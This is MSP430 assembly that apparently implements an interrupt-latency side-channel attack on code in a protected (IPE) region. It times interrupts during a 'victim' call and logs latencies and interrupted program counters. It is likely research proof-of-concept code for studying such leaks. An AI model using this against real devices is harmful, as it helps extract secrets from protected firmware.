    .sect ".att_ram_code"
    .global attacker
    .global victim
    .global TA0R
    .global TA0CCTL0
    .global TA0CCR0
	.global latencies
	.global TA0CTL
	.global pcs
count:
	.word 0x0
latencies:
	.field 0,64
pcs:
	.field 0,64
attacker:
	nop
	eint
	nop
    mov #0x4, &TA0CTL
    mov #0x10, &TA0CCR0
    mov #0x216, &TA0CTL
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop

	call #victim

	reta

isr_ipe:
    mov #0x0, &TA0CTL
	mov #latencies, r15
	add &count, r15
	add &count, r15
	mov &TA0R, 0(r15)
	sub #9, 0(r15)
	mov #pcs, r15
	add &count, r15
	add &count, r15
	add #2, sp
	mov @sp, 0(r15)
	sub #2, sp
	add #1, &count
	cmp #4, &count
	jge final
    mov #0x4, &TA0CTL
    mov #0x10, &TA0CCR0
    mov #0x216, &TA0CTL
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
final:
	reti

	.sect ".int43"
iv_43:
	.word isr_ipe
